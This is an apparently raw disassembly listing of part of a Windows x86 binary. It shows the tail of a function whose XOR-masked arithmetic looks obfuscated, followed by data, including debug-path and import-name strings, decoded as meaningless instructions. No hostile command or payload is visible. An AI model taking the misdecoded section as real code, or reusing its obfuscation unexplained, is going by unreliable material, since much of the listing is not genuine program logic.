  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	add    cl,0xb3
  420fc7:	and    ch,cl
  420fc9:	ins    BYTE PTR es:[edi],dx
  420fca:	pop    esi
  420fcb:	inc    esi
  420fcc:	test   al,0x5a
  420fce:	mov    DWORD PTR [ebx-0x32008f99],esp
  420fd4:	add    DWORD PTR [eax],eax
  420fd6:	add    BYTE PTR [eax],al
  420fd8:	inc    ebx
  420fd9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  420fdd:	jb     0x421051
  420fdf:	outs   dx,BYTE PTR gs:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
